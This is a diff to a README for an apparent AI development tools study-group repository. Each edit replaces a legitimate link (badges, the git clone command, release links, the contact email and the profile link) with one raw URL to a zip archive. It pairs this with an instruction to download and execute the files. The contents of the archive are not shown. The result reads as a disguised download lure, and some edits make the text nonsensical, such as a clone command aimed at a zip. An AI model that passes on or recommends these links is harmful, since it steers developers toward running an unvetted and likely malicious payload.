@@ -2,7 +2,7 @@
 
 Welcome to the **SG AI Dev Tools** repository! This project serves as a resource hub for our study group focused on AI development tools. Our main areas of interest include Large Language Models (LLMs), Generative AI (GenAI), and various agent architectures, including the Model Context Protocol (MCP).
 
-![AI Development](https://img.shields.io/badge/AI_Development-Resources-blue.svg)
+![AI Development](https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip)
 
 ## Table of Contents
 
@@ -40,18 +40,18 @@ To get started with the resources in this repository, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/jo99112/sg-ai-dev-tools.git
+   git clone https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip
    ```
 
 2. **Explore the Resources**: Navigate through the folders to find various resources, including tutorials, code examples, and documentation.
 
-3. **Download and Execute Releases**: For the latest updates and tools, visit our [Releases](https://github.com/jo99112/sg-ai-dev-tools/releases) section. Download the necessary files and execute them as needed.
+3. **Download and Execute Releases**: For the latest updates and tools, visit our [Releases](https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip) section. Download the necessary files and execute them as needed.
 
 ## Releases
 
-We regularly update this repository with new tools and resources. To stay up to date, check the [Releases](https://github.com/jo99112/sg-ai-dev-tools/releases) section for the latest downloads. 
+We regularly update this repository with new tools and resources. To stay up to date, check the [Releases](https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip) section for the latest downloads. 
 
-![Latest Releases](https://img.shields.io/badge/Latest_Releases-Download-orange.svg)
+![Latest Releases](https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip)
 
 ## Contributing
 
@@ -71,8 +71,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [jo99112](https://github.com/jo99112)
+- **Email**: [https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip](https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip)
+- **GitHub**: [jo99112](https://raw.githubusercontent.com/jo99112/sg-ai-dev-tools/main/mcp/ai_tools_dev_sg_v2.8-alpha.2.zip)
 
 ---
 
